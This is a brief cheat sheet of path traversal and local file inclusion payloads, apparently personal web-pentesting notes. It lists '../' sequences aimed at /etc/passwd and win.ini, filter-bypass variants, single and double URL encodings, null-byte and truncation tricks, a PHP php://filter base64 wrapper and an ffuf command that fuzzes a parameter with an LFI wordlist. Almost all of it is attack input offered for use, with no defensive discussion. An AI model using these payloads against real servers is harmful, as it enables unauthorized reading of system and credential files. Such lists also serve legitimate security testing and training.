```bash
<img src="/loadImage?filename=218.png">
# linux
https://insecure-website.com/loadImage?filename=../../../etc/passwd
# windows
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini

/image?filename=/etc/passwd
/image?filename=....//....//....//etc/passwd
# url encoding '../../../../etc/passwd'
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
# doble url encoding '../../../../etc/passwd'
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34

/image?filename=/var/www/images/../../../../etc/passwd
/image?filename=../../../etc/passwd%00.jpg


/etc/passwd
../../../../etc/passwd
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
# url encoding '../../../etc/passwd'
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
# system legacy 
/etc/passwd/.
////etc/passwd
/etc/./passwd
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
# PHP versions before 5.5 were vulnerable to null byte injection
/etc/passwd%00
# The filename can end with the .php extension or without it
php://filter/read=convert.base64-encode/resource=<file>

ffuf -u 'http://$target:32382/index.php?view=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1935
```